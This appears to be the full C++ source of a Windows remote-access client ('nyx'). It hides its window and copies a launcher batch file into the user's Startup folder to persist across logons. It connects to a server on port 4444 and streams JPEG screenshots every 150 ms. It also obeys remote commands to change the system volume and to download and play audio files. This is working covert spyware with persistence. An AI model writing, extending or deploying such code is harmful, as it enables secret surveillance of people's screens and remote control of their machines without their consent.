#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Use 127.0.0.1 for same-machine testing, or the LAN IP for remote
const char* SERVER_IP = "127.0.0.1";
const int PORT = 4444;

// ── volume ──

void SetVolume(int vol) {
    CoInitialize(0);
    IMMDeviceEnumerator* pEnum = 0;
    IMMDevice* pDev = 0;
    IAudioEndpointVolume* pVol = 0;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), 0, CLSCTX_ALL,
                   __uuidof(IMMDeviceEnumerator), (void**)&pEnum)) &&
        SUCCEEDED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDev)) &&
        SUCCEEDED(pDev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, 0, (void**)&pVol))) {
        pVol->SetMasterVolumeLevelScalar(vol / 100.0f, 0);
        pVol->Release();
    }
    if (pDev)  pDev->Release();
    if (pEnum) pEnum->Release();
    CoUninitialize();
}

// ── gdi+ helper ──

int GetEncoderClsid(const WCHAR* mime, CLSID* clsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (!size) return -1;
    Gdiplus::ImageCodecInfo* p = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, p);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(p[i].MimeType, mime) == 0) {
            *clsid = p[i].Clsid;
            free(p);
            return i;
        }
    }
    free(p);
    return -1;
}

// ── network ──

bool SendAll(SOCKET s, const char* d, int len) {
    int t = 0;
    while (t < len) {
        int n = send(s, d + t, len - t, 0);
        if (n <= 0) return false;
        t += n;
    }
    return true;
}

bool RecvAll(SOCKET s, char* d, int len) {
    int t = 0;
    while (t < len) {
        int n = recv(s, d + t, len - t, 0);
        if (n <= 0) return false;
        t += n;
    }
    return true;
}

// ── command listener ──

void CommandListener(SOCKET s) {
    while (true) {
        char cmd;
        if (recv(s, &cmd, 1, 0) != 1) break;

        if (cmd == 'V') {
            int vol;
            if (!RecvAll(s, (char*)&vol, 4)) break;
            SetVolume(vol);
        }
        else if (cmd == 'P') {
            int sz;
            if (!RecvAll(s, (char*)&sz, 4)) break;
            std::vector<char> buf(sz);
            if (!RecvAll(s, buf.data(), sz)) break;

            char tmp[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            std::string f = std::string(tmp) + "nyx_remote.mp3";
            std::ofstream out(f, std::ios::binary);
            out.write(buf.data(), sz);
            out.close();

            mciSendStringA("close nyx", 0, 0, 0);
            mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0, 0, 0);
            mciSendStringA("play nyx", 0, 0, 0);
        }
    }
}

// ── entry ──

int main() {
    SetProcessDPIAware();

    // auto-start batch
    {
        char me[MAX_PATH];
        GetModuleFileNameA(0, me, MAX_PATH);
        std::string path = std::string(getenv("USERPROFILE")) +
            "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
        std::ofstream bat(path);
        bat << "@echo off\nstart \"\" \"" << me << "\"\n";
        bat.close();
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    Gdiplus::GdiplusStartupInput gdip;
    ULONG_PTR gdipTok;
    Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);

    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) < 0) {
        Gdiplus::GdiplusShutdown(gdipTok);
        WSACleanup();
        return 1;
    }

    Gdiplus::EncoderParameters eps;
    eps.Count = 1;
    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;  // <-- fixed
    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    ULONG quality = 78;
    eps.Parameter[0].Value = &quality;

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(PORT);
        inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::thread(CommandListener, sock).detach();

            while (true) {
                HDC hdcScr = GetDC(NULL);
                int w = GetSystemMetrics(SM_CXSCREEN);
                int h = GetSystemMetrics(SM_CYSCREEN);

                HDC mem = CreateCompatibleDC(hdcScr);
                HBITMAP bmp = CreateCompatibleBitmap(hdcScr, w, h);
                HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);
                BitBlt(mem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);

                IStream* strm = 0;
                CreateStreamOnHGlobal(0, TRUE, &strm);
                {
                    Gdiplus::Bitmap gdibmp(bmp, NULL);
                    gdibmp.Save(strm, &jpegClsid, &eps);
                }

                SelectObject(mem, oldBmp);
                DeleteObject(bmp);
                DeleteDC(mem);
                ReleaseDC(NULL, hdcScr);

                STATSTG st;
                strm->Stat(&st, STATFLAG_NONAME);
                ULONG len = st.cbSize.LowPart;
                BYTE* data = new BYTE[len];
                LARGE_INTEGER li{};
                strm->Seek(li, STREAM_SEEK_SET, 0);
                ULONG rd;
                strm->Read(data, len, &rd);
                strm->Release();

                bool ok = SendAll(sock, (char*)&len, 4) && SendAll(sock, (char*)data, len);
                delete[] data;

                if (!ok) break;
                Sleep(150);
            }
        }

        closesocket(sock);
        Sleep(5000);
    }

    Gdiplus::GdiplusShutdown(gdipTok);
    WSACleanup();
    return 0;
}